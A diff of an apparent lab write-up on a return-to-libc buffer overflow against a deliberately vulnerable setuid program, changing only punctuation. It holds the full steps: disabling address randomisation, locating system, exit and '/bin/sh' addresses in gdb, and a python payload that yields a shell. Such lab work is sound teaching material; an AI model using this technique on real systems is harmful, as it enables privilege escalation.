@@ -4,17 +4,17 @@ But unlike a normal Buffer Overflow attack, RTL uses function provided by inbuil
 
 Now, steps used to perform the attack [1][2][3]:
 
-1. Turn off address randomization
+1. Turn off address randomization . 
 **Command:**
 -	$ sudo sysctl -w kernel.randomize_va_space=0
 enter password: dees
  kernel.randomize_va_space = 0
 
-2. Set Environment Variables for /bin/sh address
+2. Set Environment Variables for /bin/sh address . 
 **Command:**
 $ export MYSHELL="/bin/sh"
 
-3. Executing the vul.c file to understand the registers and their current addresses
+3. Executing the vul.c file to understand the registers and their current addresses . 
 **Command:**
 -	$  gcc -g -fno-stack-protector -m32 vul.c -o vul
 -	$ chmod 4755 vul
@@ -27,7 +27,7 @@ $ export MYSHELL="/bin/sh"
 -	$ gcc -g -fno-stack-protector -m32 vul.c -o vul
 -	$ gdb ./vul
  
-5. Extract 'system' & 'exit' addresses by compiling and running the vul.c file once
+5. Extract 'system' & 'exit' addresses by compiling and running the vul.c file once . 
 **Command:**
 -	(gdb) r
 -	(gdb) p system
@@ -35,7 +35,7 @@ $ export MYSHELL="/bin/sh"
 -	(gdb) p exit
  $2 = {<text variable, no debug info>} 0xb7e52fb0 <exit>
 
-6. Extract the address for '/bin/sh' using exp.c file
+6. Extract the address for '/bin/sh' using exp.c file . 
 **Command:**
 - $ gcc -g -fno-stack-protector -m32 exp.c -o exp 
 - $ gdb ./exp
@@ -47,7 +47,7 @@ $ export MYSHELL="/bin/sh"
 
  
 
-7. Now perform the attack by using a python script and concatenation addresses for 'system', 'exit'& '/bin/sh'
+7. Now perform the attack by using a python script and concatenation addresses for 'system', 'exit'& '/bin/sh' . 
 **Command:**
 -	$ (python -c'print "A"*23 +"\x30\xf4\xe5\xb7"+"\xb0\x2f\xe5\xb7"+"\x8f\xfe\xff\xbf"')>badfile
 -	$ gcc -g -fno-stack-protector -m32 vul.c -o vul
@@ -55,7 +55,7 @@ $ export MYSHELL="/bin/sh"
 -	(gdb) r
 
 --> Starting program: /home/seed/vul 
-Read from file: AAAAAAAAAAAAAAAAAAAAAAA0�巰/巏��� 
+Read from file: AAAAAAAAAAAAAAAAAAAAAAA0�巰/巏���  
 $
 
 8. Now, in order to execute the attack even when the kernel is generating random addresses, use following commands along with commands from steps 1-7
